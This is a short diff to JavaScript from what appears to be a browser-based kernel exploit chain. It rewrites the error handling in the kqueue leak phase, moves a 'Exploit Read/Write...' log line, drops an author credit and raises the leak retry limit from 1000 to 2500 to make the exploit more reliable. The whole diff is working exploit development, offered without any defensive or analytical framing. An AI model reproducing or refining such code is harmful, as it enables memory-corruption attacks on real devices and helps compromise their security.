@@ -1064,23 +1064,13 @@ function exploit_phase_trigger() {
 function exploit_phase_leak() {
   if (exploit_end) return;
 
-  var ok = true;
-  try {
-    leak_kqueue_safe();
-  } catch (e) {
-    ok = false;
-  }
-
-  log('Exploit Read/Write...');
-  log('Stability by M.ELHOUT');
-  
-  if (!ok) {
+  if (!leak_kqueue_safe()) {
     log('Leak failed — retrying...');
     yield_to_render(exploit_phase_trigger);
     return;
   }
 
-
+  log('Exploit Read/Write...');
   
   yield_to_render(exploit_phase_rw);
 }
@@ -1639,12 +1629,13 @@ function leak_kqueue() {
   debug('Leaking ...');
 
 
+
   var kq = new BigInt(0);
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
 
   var count = 0;
-  var MAX_KQ = 1000; 
+  var MAX_KQ = 2500; 
 
   while (count < MAX_KQ) {
     count++;
